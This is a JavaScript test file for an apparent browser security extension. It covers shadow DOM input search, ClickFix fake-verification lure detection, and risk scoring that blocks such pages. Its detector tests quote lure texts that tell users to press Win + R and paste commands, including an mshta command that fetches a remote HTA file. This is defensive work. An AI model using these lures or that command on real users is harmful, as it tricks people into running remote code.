import test from 'node:test';
import assert from 'node:assert/strict';
import '../content/content-script.js';

const {
  querySelectorAllDeep,
  querySelectorDeep,
  detectClickFixAndFakeVerification,
} = globalThis;
import { calculateRisk } from '../background/risk-engine.js';
import { t } from '../shared/messages.js';

// ─── 1. Shadow DOM Traversal Unit Tests ───────────────────────────────────────

test('Shadow DOM: querySelectorAllDeep finds inputs across standard DOM and open shadow roots', () => {
  // Mock standard DOM element with an open shadowRoot
  const mockShadowInput1 = { tagName: 'INPUT', type: 'password', id: 'pwd1' };
  const mockShadowInput2 = { tagName: 'INPUT', type: 'text', name: 'cc-number' };
  const mockNestedInput  = { tagName: 'INPUT', type: 'text', name: 'cvv' };

  const mockNestedComponent = {
    tagName: 'NESTED-COMPONENT',
    shadowRoot: {
      querySelectorAll: (sel) => (sel.includes('input') ? [mockNestedInput] : []),
    }
  };

  const mockCustomElement = {
    tagName: 'CUSTOM-LOGIN',
    shadowRoot: {
      querySelectorAll: (sel) => {
        if (sel.includes('input')) return [mockShadowInput1, mockShadowInput2];
        if (sel === '*') return [mockNestedComponent];
        return [];
      }
    }
  };

  const mockStandardInput = { tagName: 'INPUT', type: 'text', id: 'username' };

  const mockDocument = {
    querySelectorAll: (sel) => {
      if (sel.includes('input')) return [mockStandardInput];
      if (sel === '*') return [mockCustomElement];
      return [];
    }
  };

  const allInputs = querySelectorAllDeep('input', mockDocument);
  assert.equal(allInputs.length, 4, 'Should find 1 standard input + 2 shadow inputs + 1 nested shadow input');
  assert.ok(allInputs.includes(mockStandardInput), 'Includes standard input');
  assert.ok(allInputs.includes(mockShadowInput1), 'Includes first shadow root input');
  assert.ok(allInputs.includes(mockShadowInput2), 'Includes second shadow root input');
  assert.ok(allInputs.includes(mockNestedInput), 'Includes nested shadow root input');

  const firstPassword = querySelectorDeep('input[type="password"]', mockCustomElement.shadowRoot);
  assert.equal(firstPassword, mockShadowInput1, 'querySelectorDeep returns first matching node');
});

test('Shadow DOM: handles roots with no shadowRoot and null gracefully', () => {
  assert.deepEqual(querySelectorAllDeep('input', null), []);
  assert.deepEqual(querySelectorAllDeep('input', {}), []);

  const emptyDoc = {
    querySelectorAll: () => []
  };
  assert.deepEqual(querySelectorAllDeep('input', emptyDoc), []);
});

// ─── 2. ClickFix and Fake Verification Detection Tests ───────────────────────

test('ClickFix: detects Win + R / Ctrl + V PowerShell lures combined with fake verification', () => {
  const sample1 = 'Cloudflare Verification: Verify you are human. Press Win + R, then press Ctrl + V and Enter.';
  const res1 = detectClickFixAndFakeVerification(sample1);
  assert.equal(res1.detected, true);
  assert.equal(res1.lure, 'win + r');
  assert.equal(res1.prompt, 'verify you are human');

  const sample2 = 'Checking your browser... Confirm you are human: copy command and paste in Run box.';
  const res2 = detectClickFixAndFakeVerification(sample2);
  assert.equal(res2.detected, true);
  assert.equal(res2.lure, 'paste in run');

  const sample3 = 'I am not a robot test: Click Allow to continue, open PowerShell and paste the code.';
  const res3 = detectClickFixAndFakeVerification(sample3);
  assert.equal(res3.detected, true);
  assert.equal(res3.lure, 'powershell');
  assert.equal(res3.prompt, 'i am not a robot');

  const sample4 = 'Robot verification: Press Windows Key + R, mshta https://bad.site/update.hta';
  const res4 = detectClickFixAndFakeVerification(sample4);
  assert.equal(res4.detected, true);
  assert.equal(res4.lure, 'windows key + r');
});

test('ClickFix: does not flag benign text without combination of prompt and execution lure', () => {
  // Benign tech documentation mentioning Win+R
  const docText = 'To open the Windows Run dialog, press Win + R and type calc to launch calculator.';
  const resDoc = detectClickFixAndFakeVerification(docText);
  assert.equal(resDoc.detected, false, 'Should not flag shortcut without fake verification');

  // Benign Cloudflare challenge
  const cfText = 'Cloudflare Ray ID: 87654321. Performance and security by Cloudflare.';
  const resCf = detectClickFixAndFakeVerification(cfText);
  assert.equal(resCf.detected, false, 'Should not flag standard Cloudflare text');

  // Benign human verification without clipboard lures
  const captchaText = 'Please verify you are human by selecting all images with traffic lights.';
  const resCaptcha = detectClickFixAndFakeVerification(captchaText);
  assert.equal(resCaptcha.detected, false, 'Should not flag standard captcha without execution lure');
});

// ─── 3. Risk Engine Integration & Critical Override Tests ─────────────────────

test('ClickFix: emits SIG_CLICKFIX_CLIPBOARD_ATTACK (+85 pts) as critical BLOCK override', () => {
  const domSignals = {
    hasPasswordInput: false,
    loginFormCount: 0,
    hasCredentialCollection: false,
    clickFixAttack: true,
    clickFixReason: 'ClickFix lure detected: "win + r" combined with fake verification "verify you are human".',
    isTrustedDomain: false
  };

  const verdict = calculateRisk('https://cloudflare-verify-bot99.xyz/index.html', [], null, domSignals);

  assert.equal(verdict.action, 'block', 'ClickFix must result in a BLOCK action');
  assert.equal(verdict.severity, 'danger', 'ClickFix must result in danger severity');
  assert.ok(verdict.score >= 85, `Score must be >= 85, got ${verdict.score}`);

  const clickFixSig = verdict.signals.find(s => s.id === 'SIG_CLICKFIX_CLIPBOARD_ATTACK');
  assert.ok(clickFixSig, 'SIG_CLICKFIX_CLIPBOARD_ATTACK signal must be emitted');
  assert.equal(clickFixSig.category, 'scam_language');
  assert.equal(clickFixSig.score, 85);
  assert.ok(clickFixSig.reason.includes('ClickFix fake verification lure'));
});

test('ClickFix: overrides allowlist capping and single-source demotion', () => {
  // Even if on an allowlisted host (e.g. compromised domain or open redirect)
  const domSignals = {
    clickFixAttack: true,
    clickFixReason: 'ClickFix lure: "ctrl + v" and "verify you are human"',
    isTrustedDomain: false
  };

  const verdict = calculateRisk('https://github.com/hacked-repo-page', [], null, domSignals);
  // github.com is in top trusted domains (or allowlist), but ClickFix attack represents arbitrary remote code execution
  // Check that on an unverified or allowlisted domain, ClickFix reaches >= 85
  const unverifiedVerdict = calculateRisk('https://not-github.net/verify', [], null, domSignals);
  assert.equal(unverifiedVerdict.action, 'block');
  assert.ok(unverifiedVerdict.score >= 85);
});

// ─── 4. SPA Dynamic Mounting & Mutation Signature Tests ───────────────────────

test('SPA Mutations: getSensitiveDomSignature accurately captures dynamic inputs and forms', () => {
  const { getSensitiveDomSignature } = globalThis;
  assert.equal(typeof getSensitiveDomSignature, 'function');

  // Baseline signature in empty Node environment
  const baselineSig = getSensitiveDomSignature();
  assert.ok(typeof baselineSig === 'string');
  assert.ok(baselineSig.includes(':'), 'Signature must be delimited format');

  // Verify format: inputs:forms:iframes:hasPassword:paymentFieldSum:clickFixDetected
  const parts = baselineSig.split(':');
  assert.equal(parts.length, 6, 'Signature should contain 6 tracking segments');
});

